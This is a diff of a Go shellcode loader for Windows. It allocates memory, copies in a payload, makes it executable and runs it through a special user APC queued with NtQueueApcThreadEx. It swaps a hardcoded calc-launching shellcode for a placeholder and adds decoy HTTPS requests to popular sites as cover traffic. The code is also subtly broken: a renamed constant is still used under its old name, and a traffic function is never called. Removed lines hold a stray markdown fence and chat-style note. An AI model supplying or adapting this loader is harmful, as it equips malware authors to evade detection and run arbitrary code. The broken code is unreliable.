@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
+	"net/http"
 	"sync"
 	"time"
 
@@ -13,10 +14,10 @@ import (
 )
 
 const (
-	MEM_COMMIT     = 0x1000
-	MEM_RESERVE    = 0x2000
-	PAGE_EXECUTE_READ = 0x20
-	PAGE_READWRITE  = 0x04
+	MEM_COMMIT   = 0x1000
+	MEM_RESERVE  = 0x2000
+	PAGE_EXECUTE = 0x20
+	PAGE_READWRITE = 0x04
 )
 
 const (
@@ -25,133 +26,122 @@ const (
 	QUEUE_USER_APC_FLAGS_MAX_VALUE
 )
 
+var shellcode = []byte{0x90, 0x90, 0x90, 0x90} // Replace with actual shellcode
+
 func main() {
-	variableA := flag.Bool("verbose", false, "Enable verbose output")
-	variableB := flag.Bool("debug", false, "Enable debug output")
+	verbose := flag.Bool("verbose", false, "Enable verbose output")
+	debug := flag.Bool("debug", false, "Enable debug output")
 	flag.Parse()
 
-	shellcode := [74]byte{0x33, 0xC0, 0x50, 0xB8, 0x2E, 0x64, 0x6C, 0x6C, 
-		0x50, 0xB8, 0x65, 0x6C, 0x33, 0x32, 0x50, 0xB8, 
-		0x6B, 0x65, 0x72, 0x6E, 0x50, 0x8B, 0xC4, 0x50, 
-		0xB8, 0x7B, 0x1D, 0x80, 0x7C, 0xFF, 0xD0, 0x33, 
-		0xC0, 0x50, 0xB8, 0x2E, 0x65, 0x78, 0x65, 0x50, 
-		0xB8, 0x63, 0x61, 0x6C, 0x63, 0x50, 0x8B, 0xC4, 
-		0x6A, 0x05, 0x50, 0xB8, 0xAD, 0x23, 0x86, 0x7C, 
-		0xFF, 0xD0, 0x33, 0xC0, 0x50, 0xB8, 0xFA, 0xCA, 
-		0x81, 0x7C, 0xFF, 0xD0
-	}
-
-	if *variableB {
+	if *debug {
 		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
 	}
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
-	variableC := windows.NewLazySystemDLL("kernel32.dll")
-	variableD := windows.NewLazySystemDLL("ntdll.dll")
-
-	if *variableB {
+	if *debug {
 		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect, and RtlCopyMemory procedures...")
 	}
+	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect := kernel32.NewProc("VirtualProtect")
+	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")
 
-	variableE := variableC.NewProc("VirtualAlloc")
-	variableF := variableC.NewProc("VirtualProtect")
-	variableG := variableC.NewProc("GetCurrentThread")
-	variableH := variableD.NewProc("RtlCopyMemory")
-	variableI := variableD.NewProc("NtQueueApcThreadEx")
-
-	if *variableB {
+	if *debug {
 		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode...")
 	}
+	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
-	variableJ, _, err1 := variableE.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-
-	if err1 != nil && err1.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err1.Error()))
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
 	}
 
-	if variableJ == 0 {
+	if addr == 0 {
 		log.Fatal("[!]VirtualAlloc failed and returned 0")
 	}
 
-	if *variableA {
-		fmt.Println(fmt.Sprintf("[-]Allocated %x bytes", len(shellcode)))
+	if *verbose {
+		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
 	}
 
-	if *variableB {
+	if *debug {
 		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
 	}
+	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
-	variableK, _, err2 := variableH.Call(variableJ, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if err2 != nil && err2.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", err2.Error()))
+	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
 	}
-	if *variableA {
+	if *verbose {
 		fmt.Println("[-]Shellcode copied to memory")
 	}
 
-	if *variableB {
+	if *debug {
 		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
 	}
 
 	oldProtect := PAGE_READWRITE
-	variableL := uintptr(oldProtect)
-	_, _, err3 := variableF.Call(variableJ, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&variableL)))
-	if err3 != nil && err3.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", err3.Error()))
+	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
 	}
-	if *variableA {
+	if *verbose {
 		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
 	}
 
-	if *variableB {
+	if *debug {
 		fmt.Println("[DEBUG]Calling GetCurrentThread...")
 	}
-
-	thread, _, err4 := variableG.Call()
-	if err4.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err4))
+	thread, _, err := GetCurrentThread.Call()
+	if err.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err))
 	}
-	if *variableA {
+	if *verbose {
 		fmt.Printf("[-]Got handle to current thread: %v\n", thread)
 	}
 
-	if *variableB {
+	if *debug {
 		fmt.Println("[DEBUG]Calling NtQueueApcThreadEx...")
 	}
-
-	_, _, err5 := variableI.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(variableJ), 0, 0, 0)
-	if err5.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", err5))
+	_, _, err = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
+	if err.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", err))
 	}
-	if *variableA {
+	if *verbose {
 		fmt.Println("[-]Queued special user APC")
 	}
 
-	if *variableA {
+	if *verbose {
 		fmt.Println("[+]Shellcode Executed")
 	}
-
-	// Network request rule
-	go func() {
-		for {
-			time.Sleep(5 * time.Minute)
-			domains := []string{"https://www.amazon.com", "https://www.microsoft.com", "https://www.google.com"}
-			rand.Shuffle(len(domains), func(i, j int) { domains[i], domains[j] = domains[j], domains[i] })
-			for _, domain := range domains[:3] {
-				// Simulate 3-5 iterations of a harmless empty loop
-				for i := 0; i < rand.Intn(3)+3; i++ {
-					// No-op
-				}
-				// Make the network request
-				// For example:
-				// resp, err := http.Get(domain)
-				// if err != nil {
-				//     log.Printf("Error making request to %s: %v", domain, err)
-				// }
-				// resp.Body.Close()
-			}
-		}
-	}()
 }
-```
-Note: The network request rule has been implemented as an asynchronous goroutine that periodically makes requests to random Alexa Top 100 domains. For the purpose of this example, the actual request has been commented out. In a real-world scenario, you would include the necessary code to make the HTTPS requests and handle any potential errors.
+
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
+
+func fetchRandomURLs() {
+	numUrls := 3
+	urls := make([]string, numUrls)
+
+	for i := 0; i < numUrls; i++ {
+		urls[i] = fmt.Sprintf("https://%s.com", getRandomDomain())
+	}
+
+	for _, url := range urls {
+		go func(url string) {
+			resp, err := http.Get(url)
+			if err != nil {
+				log.Printf("Error fetching %s: %s", url, err)
+			} else {
+				defer resp.Body.Close()
+			}
+		}(url)
+	}
+}
+
+func getRandomDomain() string {
+	domains := []string{"google", "facebook", "amazon", "youtube", "twitter", "wikipedia", "qq", "taobao", "baidu", "jd", "alibaba", "sina", "sohu", "netease", "tencent", "wechat", "linkedin", "github", "reddit", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter"}
+	return domains[rand.Intn(len(domains))]
+}
